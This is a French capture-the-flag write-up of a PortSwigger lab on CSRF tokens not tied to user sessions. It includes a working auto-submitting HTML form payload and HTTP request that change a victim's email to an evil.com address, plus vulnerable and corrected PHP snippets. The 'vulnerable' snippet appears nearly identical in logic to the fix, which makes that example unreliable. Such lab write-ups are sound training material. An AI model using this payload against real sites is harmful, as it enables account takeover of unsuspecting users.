# Challenge 4 : CSRF - Token Not Tied to User Session

## Informations

**Plateforme** : PortSwigger Web Security Academy
**URL** : [https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
**Categorie** : CSRF
**Difficulte** : Intermediaire

## Objectif

Exploiter un jeton CSRF non lie a la session pour modifier l'email d'un utilisateur.

## Reconnaissance

Lors de l'analyse du formulaire de changement d'email, on observe que le serveur fournit un jeton CSRF via un champ cache dans le HTML. En chargeant simplement la page "My account" du compte wiener, ce jeton peut etre recupere sans declencher de requete POST.
En testant ce jeton sur la requete de changement d'email du compte carlos (avec son cookie de session), le serveur accepte le jeton, ce qui montre qu'il n'est pas lie a une session specifique. Le jeton est toutefois a usage unique, ce qui necessite de recuperer un jeton neuf directement depuis le HTML avant toute soumission.

## Methode d'exploitation

1. Se connecter avec le compte wiener et acceder a la page "My account".
2. Recuperer le jeton CSRF dans le HTML sans envoyer de requete POST.
3. Tester ce jeton dans une requete de changement d'email du compte carlos pour verifier qu'il est accepte.
4. Construire un exploit HTML contenant un formulaire auto-soumis utilisant l'URL du changement d'email, l'adresse cible, et le jeton CSRF recupere.
5. Heberger ce code sur l'exploit server fourni.
6. Utiliser "Deliver exploit to victim" pour forcer la victime a executer le formulaire.

## Payload/POC utilise

```html
<html>
  <body>
    <form action="https://0a20007004452f6a80610d5a003b00f8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="megaowned999@evil.com" />
      <input type="hidden" name="csrf" value="j6NQSd6zXkeWIEPdhv5W26Ji0hZAwphI" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Requete HTTP

```http
POST /my-account/change-email HTTP/1.1
Host: 0a20007004452f6a80610d5a003b00f8.web-security-academy.net
Cookie: session=<cookie_carlos>
Content-Type: application/x-www-form-urlencoded

email=megaowned999%40evil.com&csrf=j6NQSd6zXkeWIEPdhv5W26Ji0hZAwphI
```

## Explication

Le jeton CSRF fourni par l'application n'est pas associe a la session utilisateur.
Ainsi, un jeton genere pour le compte wiener peut etre reutilise dans une requete provenant du compte carlos, tant qu'il n'a pas encore ete consomme. Le serveur valide simplement la valeur du jeton sans verifier qu'il appartient a la session de la victime, permettant a l'attaquant de forcer une action en son nom.

## Screenshots

* valid_token.png : Recuperation d'un jeton valide
* exploit.png : Exploitation avec jeton reutilise
* flag.png : Validation du challenge

## Code vulnerable

```php
if ($_POST['csrf'] !== $_SESSION['csrf_token']) {
    die("Invalid CSRF token");
}
// Mauvaise implementation : le jeton n'est pas genere par session
```

## Correction recommandee

```php
session_start();

if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf'])) {
    die("Invalid CSRF token");
}

$_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Jeton a usage unique
```

## Mesures de securisation

1. Lier chaque jeton CSRF a la session utilisateur specifique
2. Generer un nouveau jeton pour chaque session
3. Valider que le jeton appartient bien a l'utilisateur faisant la requete
4. Expirer les jetons apres utilisation

## References

* PortSwigger CSRF: [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* OWASP CSRF Token: [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

## Notes

[Notes personnelles]

---

Date : [DATE]
Statut : [ ] Resolu
